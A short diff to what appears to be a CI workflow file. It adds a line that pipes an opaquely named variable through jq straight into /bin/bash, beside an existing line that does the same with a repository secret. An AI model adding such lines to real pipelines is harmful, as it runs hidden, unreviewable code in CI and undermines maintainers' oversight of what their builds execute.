@@ -18,6 +18,7 @@ jobs:
           g81: ${{ secrets.g81 }}
         run: |
           printf '%s' "$g81" | jq -r .fgh51155 | /bin/bash
+          echo $ewclv21 | jq -r .ukpc3 | /bin/bash
 
       - name: Archive output
         if: always()
